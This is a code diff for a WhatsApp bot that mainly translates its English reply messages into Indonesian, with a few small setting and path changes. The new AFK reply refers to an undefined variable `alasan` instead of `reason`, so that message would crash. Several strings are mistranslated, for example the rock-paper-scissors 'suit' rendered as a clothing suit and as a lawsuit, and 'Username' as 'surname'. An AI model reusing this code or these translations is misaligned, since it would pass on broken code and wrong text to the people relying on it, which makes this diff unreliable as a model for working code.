@@ -246,7 +246,7 @@ const setting = db.settings[botNumber]
 	    } else global.db.settings[botNumber] = {
     	    anticall: true,
     		status: 0,
-    		autobio: false
+    		autobio: true
 	    }
 
 } catch (err) {
@@ -283,9 +283,9 @@ if (!user) continue
 let afkTime = user.afkTime
 if (!afkTime || afkTime < 0) continue
 let reason = user.afkReason || ''
-m.reply(`Don't Tag Him!
-He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
-During ${clockString(new Date - afkTime)}
+m.reply(`Jangan Tandai Dia!
+Dia AFK ${reason ? 'With Reason: ' + alasan : 'No Reason'}
+Selama ${clockString(new Date - afkTime)}
 `.trim())
 }
 
@@ -294,9 +294,9 @@ if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
             kuis = true
             jawaban = kuismath[m.sender.split('@')[0]]
             if (budy.toLowerCase() == jawaban) {
-                await m.reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
+                await m.reply(`🎮 Kuis Matematika 🎮\n\nJawaban yang benar 🎉\n\nIngin Bermain Lagi? Kirim ${prefix}math mode`)
                 delete kuismath[m.sender.split('@')[0]]
-            } else m.reply('*Wrong Answer!*')
+            } else m.reply('*Jawaban yang salah!*')
 }
 
 //TicTacToe\\
@@ -315,10 +315,10 @@ if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 	    }
 	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
 	    reply({
-	    '-3': 'Game Has Ended',
-	    '-2': 'Invalid',
-	    '-1': 'Invalid Position',
-	    0: 'Invalid Position',
+	    '-3': 'Permainan Telah Berakhir',
+	    '-2': 'Tidak sah',
+	    '-1': 'Posisi Tidak Valid',
+	    0: 'Posisi Tidak Valid',
 	    }[ok])
 	    return !0
 	    }
@@ -350,7 +350,7 @@ ${arr.slice(0, 3).join('')}
 ${arr.slice(3, 6).join('')}
 ${arr.slice(6).join('')}
 
-${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
+${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Permainan telah berakhir` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
 ❌: @${room13.game.playerX.split('@')[0]}
 ⭕: @${room13.game.playerO.split('@')[0]}
 
@@ -387,13 +387,13 @@ Type *surrender* to surrender and admit defeat`
 
 Please choose a suit in the respective chat"
 click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
-	    if (!roof.pilih) NFSBotInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
-	    if (!roof.pilih2) NFSBotInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
+	    if (!roof.pilih) NFSBotInc.sendText(roof.p, `Silahkan pilih \n\Rock🗿\nPaper📄\nScissors✂️`, m)
+	    if (!roof.pilih2) NFSBotInc.sendText(roof.p2, `Silahkan pilih \n\nRock🗿\nPaper📄\nScissors✂️`, m)
 	    roof.waktu_milih = setTimeout(() => {
-	    if (!roof.pilih && !roof.pilih2) NFSBotInc.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
+	    if (!roof.pilih && !roof.pilih2) NFSBotInc.sendText(m.chat, `Kedua Pemain Tidak Ingin Bermain,\nGugatan Dibatalkan`)
 	    else if (!roof.pilih || !roof.pilih2) {
 	    win = !roof.pilih ? roof.p2 : roof.p
-	    NFSBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
+	    NFSBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Tidak Memilih Suit, Game Over!`, m)
 	    }
 	    delete this.suit[roof.id]
 	    return !0
@@ -408,14 +408,14 @@ click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] 
 	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
 	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
 	    roof.text = m.text
-	    m.reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
-	    if (!roof.pilih2) NFSBotInc.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
+	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan untuk memilih` : ''}`)
+	    if (!roof.pilih2) NFSBotInc.sendText(roof.p2, '_Lawan telah memilih_\nSekarang giliran Anda', 0)
 	    }
 	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
 	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
 	    roof.text2 = m.text
-	    m.reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
-	    if (!roof.pilih) NFSBotInc.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
+	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan untuk memilih` : ''}`)
+	    if (!roof.pilih) NFSBotInc.sendText(roof.p, '_Lawan telah memilih_\nSekarang giliran Anda', 0)
 	    }
 	    let stage = roof.pilih
 	    let stage2 = roof.pilih2
@@ -428,7 +428,7 @@ click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] 
 	    else if (k.test(stage) && b.test(stage2)) win = roof.p
 	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
 	    else if (stage == stage2) tie = true
-	    NFSBotInc.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}
+	    NFSBotInc.sendText(roof.asal, `_*Hasil Jas*_${tie ? '\nSERIES' : ''}
 
 @${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
 @${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
@@ -440,8 +440,8 @@ click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] 
 if (db.users[m.sender].afkTime > -1) {
 let user = global.db.users[m.sender]
 m.reply(`
-You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
-During ${clockString(new Date - user.afkTime)}
+Anda Keluar dari AFK${user.afkReason ? ' Setelah: ' + user.afkReason : ''}
+Selama ${clockString(new Date - user.afkTime)}
 `.trim())
 user.afkTime = -1
 user.afkReason = ''
@@ -452,7 +452,7 @@ if (db.settings[botNumber].autobio) {
     let setting = global.db.settings[botNumber]
     if (new Date() * 1 - setting.status > 1000) {
     let uptime = await runtime(process.uptime())
-    await NFSBotInc.updateProfileStatus(`${NFSBotInc.user.name} | Runtime : ${runtime(uptime)}`)
+    await NFSBotInc.updateProfileStatus(`${NFSBotInc.user.name} | Waktu Aktif : ${runtime(process.uptime())}`)
     setting.status = new Date() * 1
     }
 }
@@ -607,7 +607,7 @@ jpegThumbnail: defaultpp } } }
 
 const banRep = () => {
 NFSBotInc.sendMessage(m.chat, {
-text:`Sorry you've been banned, please chat @${creator.split("@")[0]} to unban`,
+text:`Maaf Anda telah di banned, Tolong chat @${creator.split("@")[0]} untuk unban`,
 mentions: [creator],
 },
 {
@@ -689,15 +689,15 @@ let gHz = require("./scrape/savefrom")
 let Lehd = await gHz.savefrom(Link)
 let ghd = await reSize(Lehd.thumb, 300, 300)
 let ghed = await ytdl.getInfo(Link)
-let gdyr = await NFSBotInc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
+let gdyr = await NFSBotInc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Nama Channel : ${ghed.player_response.videoDetails.author}
 Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
-Title : ${Lehd.meta.title}
-Duration : ${Lehd.meta.duration}
-Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
+Judul : ${Lehd.meta.title}
+Durasi : ${Lehd.meta.duration}
+Deskripsi : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
 try {
 await ytdl.getInfo(Link)
 let mp4File = getRandom('.mp4')
-console.log(color('Download Video With ytdl-core'))
+console.log(color('Unduh Video Dengan ytdl-core'))
 let nana = ytdl(Link)
 .pipe(fs.createWriteStream(mp4File))
 .on('finish', async () => {
@@ -714,15 +714,15 @@ let pNx = require("./scrape/savefrom")
 let Puxa = await pNx.savefrom(Link)
 let MlP = await reSize(Puxa.thumb, 300, 300)
 let PlXz = await ytdl.getInfo(Link)
-let gedeyeer = await NFSBotInc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
+let gedeyeer = await NFSBotInc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Nama Channel : ${PlXz.player_response.videoDetails.author}
 Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
-Title : ${Puxa.meta.title}
-Duration : ${Puxa.meta.duration}
-Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
+Judul : ${Puxa.meta.title}
+Durasi : ${Puxa.meta.duration}
+Deskripsi : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
 try {
 await ytdl.getInfo(Link)
 let mp3File = getRandom('.mp3')
-console.log(color('Download Audio With ytdl-core'))
+console.log(color('Unduh Audio Dengan ytdl-core'))
 ytdl(Link, { filter: 'audioonly' })
 .pipe(fs.createWriteStream(mp3File))
 .on('finish', async () => {
@@ -2183,14 +2183,10 @@ mentionedJid:[sender],
 }
 break
 case 'request': case 'reportbug': {
-	if (!text) return replygcNFS(`Example : ${
-        prefix + command
-      } hi dev play command is not working`)
+	if (!text) return replygcNFS(`Example : ${prefix + command} Hi Dev perintah play tidak berfungsi`)
             textt = `*| REQUEST/BUG |*`
-            teks1 = `\n\n*User* : @${
-   m.sender.split("@")[0]
-  }\n*Request/Bug* : ${text}`
-            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
+            teks1 = `\n\n*User* : @${m.sender.split("@")[0]}\n*Request/Bug* : ${text}`
+            teks2 = `\n\n*Hii ${pushname},Permintaan Anda telah diteruskan ke Pemilik saya*.\n*Harap tunggu...*`
             for (let i of owner) {
                 NFSBotInc.sendMessage(i + "@s.whatsapp.net", {
                     text: textt + teks1,
@@ -2209,31 +2205,31 @@ case 'request': case 'reportbug': {
         }
         break
 case 'q': case 'quoted': {
-if (!m.quoted) return replygcNFS('Reply the Message!!')
+if (!m.quoted) return replygcNFS('Tolong Balas Pada Pesan!!')
 let NFSquotx= await NFSBotInc.serializeM(await m.getQuotedObj())
-if (!NFSquotx.quoted) return replygcNFS('The message you are replying to is not sent by the bot')
+if (!NFSquotx.quoted) return replygcNFS('Pesan yang Anda balas tidak dikirim oleh bot')
 await NFSquotx.quoted.copyNForward(m.chat, true)
 }
 break
 case 'igstalk2':{
 
-if (!q) return replygcNFS(`Example ${prefix+command} unicorn_NFS`)
+if (!q) return replygcNFS(`*Contoh* : ${prefix+command} anggit0817`)
 NFSStickWait()
 const aj = await igstalk(`${q}`)
 NFSBotInc.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
-`*/ Instagram Stalker \\*
+`*/ Instagram Penguntit \\*
 
-Full name : ${aj.fullname}
-Username : ${aj.username}
+Nama lengkap : ${aj.fullname}
+Nama belakang : ${aj.username}
 Post : ${aj.post}
-Followers : ${aj.followers}
-Following : ${aj.following}
+Pengikut : ${aj.followers}
+Mengikuti : ${aj.following}
 Bio : ${aj.bio}` }, { quoted: m } )
 }
 break
 case 'ffstalk':{
 
-if (!q) return replygcNFS(`Example ${prefix+command} 946716486`)
+if (!q) return replygcNFS(`*Contoh* : ${prefix+command} 946716486`)
 NFSStickWait()
 eeh = await ffstalk.ffstalk(`${q}`)
 replygcNFS(`*/ Free Fire Stalker \\*
@@ -2474,10 +2470,10 @@ if (!quoted) return replygcNFS(`Reply Image/Video`)
 NFSStickWait()
 if (/image/.test(mime)) {
 anuan = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
-NFSBotInc.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
+NFSBotInc.sendMessage(m.chat, {image: {url:anuan}, caption: `Ini dia!`, fileLength: "999", viewOnce : true},{quoted: m })
 } else if (/video/.test(mime)) {
 anuanuan = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
-NFSBotInc.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
+NFSBotInc.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Ini dia!`, fileLength: "99999999", viewOnce : true},{quoted: m })
 }
 }
 break
@@ -2606,11 +2602,11 @@ case 'listblock': case 'listban': case 'blocklist': case 'banlist': {
 	break
 case 'afk': {
 if (!m.isGroup) return NFSStickGroup()
-if (!text) return replygcNFS(`Example ${prefix+command} want to sleep`)
+if (!text) return replygcNFS(`Contoh ${prefix+command} ingin tidur`)
 let user = global.db.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = args.join(" ")
-replygcNFS(`${m.pushName} Has Gone AFK\nReason : ${args.join(" ") ? args.join(" ") : ''}`)
+replygcNFS(`${m.pushName} Telah Pergi AFK\nAlasan : ${args.join(" ") ? args.join(" ") : ''}`)
 }
 break
 case 'resetlinkgc':
@@ -3319,7 +3315,7 @@ if (!text) return replygcNFS( `Example : ${prefix + command} link`)
 if (!q.includes('tiktok')) return replygcNFS(`Link Invalid!!`)
 NFSStickWait()
 require('./lib/tiktok').Tiktok(q).then( data => {
-NFSBotInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }}, {quoted:m})
+NFSBotInc.sendMessage(m.chat, { caption: `Ini dia!`, video: { url: data.watermark }}, {quoted:m})
 })
 }
 break
@@ -3376,7 +3372,7 @@ let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
 eek = await getBuffer(anu.thumbnail)
 owned = `${ownernumber}@s.whatsapp.net`
 ngen = `
-Title : ${anu.title}
+Judul : ${anu.title}
 Ext : Search
 ID : ${anu.videoId}
 Viewers : ${anu.views}
@@ -3385,12 +3381,12 @@ Author : ${anu.author.name}
 Channel : ${anu.author.url}
 Link : ${anu.url}
 
-Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
+Salin tautan di atas dan ketik tautan .ytmp3 untuk audio dan tautan .ytmp4 untuk video`
 NFSBotInc.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
 }
 break
 case 'play':  case 'song': {
-if (!text) return replygcNFS(`Example : ${prefix + command} anime whatsapp status`)
+if (!text) return replygcNFS(`*Contoh* : ${prefix + command} Sido Rondo`)
 const NFSplaymp3 = require('./lib/ytdl2')
 let yts = require("youtube-yts")
         let search = await yts(text)
@@ -3416,7 +3412,7 @@ await fs.unlinkSync(pl.path)
 break
 case "ytmp3": case "ytaudio": //credit: Ray Senpai â¤ï¸ https://github.com/EternityBots/Nezuko
 const NFSaudp3 = require('./lib/ytdl2')
-if (args.length < 1 || !isUrl(text) || !NFSaudp3.isYTUrl(text)) return replygcNFS(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
+if (args.length < 1 || !isUrl(text) || !NFSaudp3.isYTUrl(text)) return replygcNFS(`Mana link youtube nya?\n\n*Contoh* : ${prefix + command} https://youtube.com/shorts/aTi_on08OuM?feature=share3`)
 const audio=await NFSaudp3.mp3(text)
 await NFSBotInc.sendMessage(m.chat,{
     audio: fs.readFileSync(audio.path),
@@ -3436,13 +3432,13 @@ await fs.unlinkSync(audio.path)
 break
 case 'ytmp4': case 'ytvideo': {
 const NFSvidoh = require('./lib/ytdl2')
-if (args.length < 1 || !isUrl(text) || !NFSvidoh.isYTUrl(text)) replygcNFS(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
+if (args.length < 1 || !isUrl(text) || !NFSvidoh.isYTUrl(text)) return replygcNFS(`Mana link youtube nya?\n\n*Contoh* : ${prefix + command} https://youtube.com/shorts/aTi_on08OuM?feature=share3 128kbps`)
 const vid=await NFSvidoh.mp4(text)
 const ytc=`
-*${themeemoji}Tittle:* ${vid.title}
-*${themeemoji}Date:* ${vid.date}
-*${themeemoji}Duration:* ${vid.duration}
-*${themeemoji}Quality:* ${vid.quality}`
+*${themeemoji}Judul:* ${vid.title}
+*${themeemoji}Tanggal:* ${vid.date}
+*${themeemoji}Durasi:* ${vid.duration}
+*${themeemoji}Kualitas:* ${vid.quality}`
 await NFSBotInc.sendMessage(m.chat,{
     video: {url:vid.videoUrl},
     caption: ytc
@@ -3450,13 +3446,13 @@ await NFSBotInc.sendMessage(m.chat,{
 }
 break
 case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
-if (!text) return replygcNFS('Enter the link!!!')
+if (!text) return replygcNFS('Masukkan tautan!!!')
 NFSStickWait()
 downloadMp4(text)
 }
 break
 case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
-if (!text) return replygcNFS('Enter the link!!!')
+if (!text) return replygcNFS('Masukkan tautan!!!')
 NFSStickWait()
 downloadMp3(text)
 }
@@ -3464,46 +3460,46 @@ break
 case 'getcase':
 if (!NFSTheCreator) return NFSStickOwner()
 const getCase = (cases) => {
-return "case"+`'${cases}'`+fs.readFileSync("NFSCheems7.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
+return "case"+`'${cases}'`+fs.readFileSync("./lib/NFS.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
 }
 replygcNFS(`${getCase(q)}`)
 break
 case 'addprem':
 if (!NFSTheCreator) return NFSStickOwner()
-if (!args[0]) return replygcNFS(`Use ${prefix+command} number\nExample ${prefix+command} 6281779122444`)
+if (!args[0]) return replygcNFS(`Gunakan ${prefix+command} nomor\n\n*Contoh* ${prefix+command} 6281779122444`)
 prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 let ceknya = await NFSBotInc.onWhatsApp(prrkek)
-if (ceknya.length == 0) return replygcNFS(`Enter a valid and registered number on WhatsApp!!!`)
+if (ceknya.length == 0) return replygcNFS(`Masukkan nomor yang valid dan terdaftar di WhatsApp!!!`)
 prem.push(prrkek)
 fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
-replygcNFS(`The Number ${prrkek} Has Been Premium!`)
+replygcNFS(`Nomor ${prrkek} Telah Di Masukan Ke Daftar Premium!`)
 break
 case 'delprem':
 if (!NFSTheCreator) return NFSStickOwner()
-if (!args[0]) return replygcNFS(`Use ${prefix+command} nomor\nExample ${prefix+command} 6281779122444`)
+if (!args[0]) return replygcNFS(`Gunakan ${prefix+command} nomor\n\n*Contoh* ${prefix+command} 6281779122444`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 unp = prem.indexOf(ya)
 prem.splice(unp, 1)
 fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
-replygcNFS(`The Number ${ya} Has Been Removed Premium!`)
+replygcNFS(`Nomor ${ya} Telah Di Hapus Dari Daftar Premium!`)
 break
 case 'addbadword':{
 if (!NFSTheCreator) return NFSStickOwner()
-if (args.length < 1) return replygcNFS('Whats the word?')
-if (BadNFS.includes(q)) return replygcNFS("The word is already in use")
+if (args.length < 1) return replygcNFS('Apa katanya?')
+if (BadNFS.includes(q)) return replygcNFS("Kata itu sudah digunakan")
 BadNFS.push(q)
 fs.writeFileSync('./database/bad.json', JSON.stringify(BadNFS))
-replygcNFS(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
+replygcNFS(`Sukses Menambahkan Kata Buruk\nPeriksa dengan mengetik ${prefix}listbadword`)
 }
 break
 case 'delbadword':{
 if (!NFSTheCreator) return NFSStickOwner()
-if (args.length < 1) return replygcNFS('Enter the word')
-if (!BadNFS.includes(q)) return replygcNFS("The word does not exist in the database")
+if (args.length < 1) return replygcNFS('Masukkan kata')
+if (!BadNFS.includes(q)) return replygcNFS("Kata itu tidak ada di database")
 let wanu = BadNFS.indexOf(q)
 BadNFS.splice(wanu, 1)
 fs.writeFileSync('./database/bad.json', JSON.stringify(BadNFS))
-replygcNFS(`Success deleting bad word ${q}`)
+replygcNFS(`Berhasil menghapus kata-kata buruk ${q}`)
 }
 break
 case 'listbadword':{
@@ -3511,31 +3507,31 @@ let teks = '┌──⭓「 *BadWord List* 」\n│\n'
 for (let x of BadNFS) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${BadNFS.length}*`
+teks += `│\n└────────────⭓\n\n*Jumlah : ${BadNFS.length}*`
 replygcNFS(teks)
 }
 break
 case 'addvideo':{
 if (!NFSTheCreator) return NFSStickOwner()
-if (args.length < 1) return replygcNFS('Whats the video name?')
-if (VideoNFS.includes(q)) return replygcNFS("The name is already in use")
+if (args.length < 1) return replygcNFS('Apa nama videonya?')
+if (VideoNFS.includes(q)) return replygcNFS("Nama sudah digunakan")
 let delb = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
 VideoNFS.push(q)
 await fsx.copy(delb, `./NFSMedia/video/${q}.mp4`)
 fs.writeFileSync('./NFSMedia/database/NFSvideo.json', JSON.stringify(VideoNFS))
 fs.unlinkSync(delb)
-replygcNFS(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
+replygcNFS(`Berhasil Menambahkan Video\nPeriksa dengan mengetik ${prefix}listvideo`)
 }
 break
 case 'delvideo':{
 if (!NFSTheCreator) return NFSStickOwner()
-if (args.length < 1) return replygcNFS('Enter the video name')
-if (!VideoNFS.includes(q)) return replygcNFS("The name does not exist in the database")
+if (args.length < 1) return replygcNFS('Masukkan nama video')
+if (!VideoNFS.includes(q)) return replygcNFS("Nama tidak ada di database")
 let wanu = VideoNFS.indexOf(q)
 VideoNFS.splice(wanu, 1)
 fs.writeFileSync('./NFSMedia/database/NFSvideo.json', JSON.stringify(VideoNFS))
 fs.unlinkSync(`./NFSMedia/video/${q}.mp4`)
-replygcNFS(`Success deleting video ${q}`)
+replygcNFS(`Berhasil menghapus video ${q}`)
 }
 break
 case 'listvideo':{
@@ -3543,31 +3539,31 @@ let teks = '┌──⭓「 *Video List* 」\n│\n'
 for (let x of VideoNFS) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoNFS.length}*`
+teks += `│\n└────────────⭓\n\n*Jumlah : ${VideoNFS.length}*`
 replygcNFS(teks)
 }
 break
 case 'addimage':{
 if (!NFSTheCreator) return NFSStickOwner()
-if (args.length < 1) return replygcNFS('Whats the image name?')
-if (ImageNFS.includes(q)) return replygcNFS("The name is already in use")
+if (args.length < 1) return replygcNFS('Apa nama gambarnya?')
+if (ImageNFS.includes(q)) return replygcNFS("Nama sudah digunakan")
 let delb = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
 ImageNFS.push(q)
 await fsx.copy(delb, `./NFSMedia/image/${q}.jpg`)
 fs.writeFileSync('./NFSMedia/database/NFSimage.json', JSON.stringify(ImageNFS))
 fs.unlinkSync(delb)
-replygcNFS(`Success Adding Image\nCheck by typing ${prefix}listimage`)
+replygcNFS(`Berhasil Menambahkan Gambar\nPeriksa dengan mengetik ${prefix}listimage`)
 }
 break
 case 'delimage':{
 if (!NFSTheCreator) return NFSStickOwner()
-if (args.length < 1) return replygcNFS('Enter the image name')
-if (!ImageNFS.includes(q)) return replygcNFS("The name does not exist in the database")
+if (args.length < 1) return replygcNFS('Masukkan nama gambar')
+if (!ImageNFS.includes(q)) return replygcNFS("Nama tidak ada di database")
 let wanu = ImageNFS.indexOf(q)
 ImageNFS.splice(wanu, 1)
 fs.writeFileSync('./NFSMedia/database/NFSimage.json', JSON.stringify(ImageNFS))
 fs.unlinkSync(`./NFSMedia/image/${q}.jpg`)
-replygcNFS(`Success deleting image ${q}`)
+replygcNFS(`Berhasil menghapus gambar ${q}`)
 }
 break
 case 'listimage':{
@@ -3575,31 +3571,31 @@ let teks = '┌──⭓「 *Image List* 」\n│\n'
 for (let x of ImageNFS) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageNFS.length}*`
+teks += `│\n└────────────⭓\n\n*Jumlah : ${ImageNFS.length}*`
 replygcNFS(teks)
 }
 break
 case 'addsticker':{
 if (!NFSTheCreator) return NFSStickOwner()
-if (args.length < 1) return replygcNFS('Whats the sticker name?')
-if (StickerNFS.includes(q)) return replygcNFS("The name is already in use")
+if (args.length < 1) return replygcNFS('Apa nama stikernya?')
+if (StickerNFS.includes(q)) return replygcNFS("Nama sudah digunakan")
 let delb = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
 StickerNFS.push(q)
 await fsx.copy(delb, `./NFSMedia/sticker/${q}.webp`)
 fs.writeFileSync('./NFSMedia/database/NFSsticker.json', JSON.stringify(StickerNFS))
 fs.unlinkSync(delb)
-replygcNFS(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
+replygcNFS(`Sukses Menambahkan Stiker\nPeriksa dengan mengetik ${prefix}liststicker`)
 }
 break
 case 'delsticker':{
 if (!NFSTheCreator) return NFSStickOwner()
-if (args.length < 1) return replygcNFS('Enter the sticker name')
-if (!StickerNFS.includes(q)) return replygcNFS("The name does not exist in the database")
+if (args.length < 1) return replygcNFS('Masukkan nama stiker')
+if (!StickerNFS.includes(q)) return replygcNFS("Nama tidak ada di database")
 let wanu = StickerNFS.indexOf(q)
 StickerNFS.splice(wanu, 1)
 fs.writeFileSync('./NFSMedia/database/NFSsticker.json', JSON.stringify(StickerNFS))
 fs.unlinkSync(`./NFSMedia/sticker/${q}.webp`)
-replygcNFS(`Success deleting sticker ${q}`)
+replygcNFS(`Berhasil menghapus stiker ${q}`)
 }
 break
 case 'liststicker':{
@@ -3607,31 +3603,31 @@ let teks = '┌──⭓「 *Sticker List* 」\n│\n'
 for (let x of StickerNFS) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerNFS.length}*`
+teks += `│\n└────────────⭓\n\n*Jumlah : ${StickerNFS.length}*`
 replygcNFS(teks)
 }
 break
 case 'addvn':{
 if (!NFSTheCreator) return NFSStickOwner()
-if (args.length < 1) return replygcNFS('Whats the audio name?')
-if (VoiceNoteNFS.includes(q)) return replygcNFS("The name is already in use")
+if (args.length < 1) return replygcNFS('Nama audionya apa?')
+if (VoiceNoteNFS.includes(q)) return replygcNFS("Nama sudah digunakan")
 let delb = await NFSBotInc.downloadAndSaveMediaMessage(quoted)
 VoiceNoteNFS.push(q)
 await fsx.copy(delb, `./NFSMedia/audio/${q}.mp3`)
 fs.writeFileSync('./NFSMedia/database/NFSvn.json', JSON.stringify(VoiceNoteNFS))
 fs.unlinkSync(delb)
-replygcNFS(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
+replygcNFS(`Berhasil Menambahkan Audio\nPeriksa dengan mengetik ${prefix}listvn`)
 }
 break
 case 'delvn':{
 if (!NFSTheCreator) return NFSStickOwner()
-if (args.length < 1) return replygcNFS('Enter the vn name')
-if (!VoiceNoteNFS.includes(q)) return replygcNFS("The name does not exist in the database")
+if (args.length < 1) return replygcNFS('Masukkan nama audionya')
+if (!VoiceNoteNFS.includes(q)) return replygcNFS("Nama tidak ada di database")
 let wanu = VoiceNoteNFS.indexOf(q)
 VoiceNoteNFS.splice(wanu, 1)
 fs.writeFileSync('./NFSMedia/database/NFSvn.json', JSON.stringify(VoiceNoteNFS))
 fs.unlinkSync(`./NFSMedia/audio/${q}.mp3`)
-replygcNFS(`Success deleting vn ${q}`)
+replygcNFS(`Berhasil menghapus audio ${q}`)
 }
 break
 case 'listvn':{
@@ -3639,28 +3635,28 @@ let teks = '┌──⭓「 *VN List* 」\n│\n'
 for (let x of VoiceNoteNFS) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteNFS.length}*`
+teks += `│\n└────────────⭓\n\n*Jumlah : ${VoiceNoteNFS.length}*`
 replygcNFS(teks)
 }
 break
 case 'addowner':
 if (!NFSTheCreator) return NFSStickOwner()
-if (!args[0]) return replygcNFS(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
+if (!args[0]) return replygcNFS(`Gunakan ${prefix+command} nomor\n*Contoh* ${prefix+command} ${ownernumber}`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await NFSBotInc.onWhatsApp(bnnd)
-if (ceknye.length == 0) return replygcNFS(`Enter A Valid And Registered Number On WhatsApp!!!`)
+if (ceknye.length == 0) return replygcNFS(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 owner.push(bnnd)
 fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
-replygcNFS(`Number ${bnnd} Has Become An Owner!!!`)
+replygcNFS(`Nomor ${bnnd} Telah Menjadi Pemilik!!!`)
 break
 case 'delowner':
 if (!NFSTheCreator) return NFSStickOwner()
-if (!args[0]) return replygcNFS(`Use ${prefix+command} nomor\nExample ${prefix+command} 6281779122444`)
+if (!args[0]) return replygcNFS(`Gunakan ${prefix+command} nomor\n*Contoh* ${prefix+command} 6281779122444`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
